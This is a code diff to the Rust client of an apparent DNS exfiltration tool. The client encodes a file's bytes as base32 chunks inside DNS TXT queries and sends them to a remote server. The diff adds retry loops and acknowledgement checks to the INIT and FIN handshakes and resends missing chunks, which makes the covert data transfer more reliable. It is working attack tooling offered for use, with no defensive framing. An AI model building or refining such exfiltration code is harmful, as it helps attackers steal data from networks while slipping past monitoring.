@@ -12,6 +12,8 @@ use tokio::net::UdpSocket as TokioUdpSocket;
 use tokio::time::{Duration, sleep};
 
 const CHUNK_SIZE: usize = 39;
+const MAX_FIN_RETRIES: usize = 5;
+const MAX_INIT_RETRIES: usize = 5;
 
 #[derive(Clone, Debug)]
 pub struct ExfilPayload {
@@ -62,7 +64,19 @@ impl Client {
     async fn send_init(&self, client: &mut AsyncClient, filename: &str, session_id: &str, total_chunks: usize) -> Result<(), DnsexError> {
         for (_, chunk) in filename.as_bytes().chunks(CHUNK_SIZE).enumerate() {
             let init_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunk), total_chunks, session_id, ChunkFlag::Init as u32);
-            self.send_query(client, &init_fqdn).await?;
+
+            let mut acked = false;
+            for _ in 0..MAX_INIT_RETRIES {
+                let responses = self.send_query(client, &init_fqdn).await?;
+                if responses.iter().any(|r| r == "OK") {
+                    acked = true;
+                    break;
+                }
+            }
+
+            if !acked {
+                return Err(DnsexError::ConfigError("Failed to init transfer".into()));
+            }
         }
 
         Ok(())
@@ -95,18 +109,25 @@ impl Client {
     async fn send_fin(&self, client: &mut AsyncClient, session_id: &str, total_chunks: usize) -> Result<Vec<usize>, DnsexError> {
         let flags = ChunkFlag::Fin as u32;
         let fin_fqdn = self.build_fqdn(&BASE32_NOPAD.encode("EOF".as_bytes()), total_chunks, session_id, flags);
-        let responses = self.send_query(client, &fin_fqdn).await?;
-        let mut missing: Vec<usize> = Vec::new();
 
-        for response in responses {
-            if response == "OK" {
-                return Ok(Vec::new());
-            } else if let Some(missing_str) = response.strip_prefix("MISSING:") {
-                missing = missing_str.split(',').filter_map(|s| s.parse::<usize>().ok()).collect();
+        for _ in 0..MAX_FIN_RETRIES {
+            let responses = self.send_query(client, &fin_fqdn).await?;
+
+            if responses.is_empty() {
+                continue;
+            }
+
+            for response in responses {
+                if response == "OK" {
+                    return Ok(Vec::new());
+                } else if let Some(missing_str) = response.strip_prefix("MISSING:") {
+                    let missing: Vec<usize> = missing_str.split(',').filter_map(|s| s.parse::<usize>().ok()).collect();
+                    return Ok(missing);
+                }
             }
         }
 
-        Ok(missing)
+        Err(DnsexError::ConfigError("Failed to get valid FIN response from server".into()))
     }
 
     async fn send_missing(&self, client: &mut AsyncClient, data: &[u8], session_id: &str, missing: &[usize]) -> Result<(), DnsexError> {
@@ -115,7 +136,6 @@ impl Client {
         for &seq in missing {
             if seq < chunks.len() {
                 let data_fqdn = self.build_fqdn(&BASE32_NOPAD.encode(chunks[seq]), seq, session_id, ChunkFlag::Data as u32);
-
                 self.send_query(client, &data_fqdn).await?;
             }
         }
@@ -158,12 +178,11 @@ impl Client {
 
     async fn send_query(&self, client: &mut AsyncClient, fqdn: &str) -> Result<Vec<String>, DnsexError> {
         let domain_name = Name::from_str(fqdn)?;
-
         let response = client.query(domain_name, DNSClass::IN, RecordType::TXT).await?;
-
         let mut responses: Vec<String> = Vec::new();
 
         if response.answers().is_empty() {
+            println!("Answer is empty");
         } else {
             for answer in response.answers() {
                 if let Some(RData::TXT(txt)) = answer.data() {
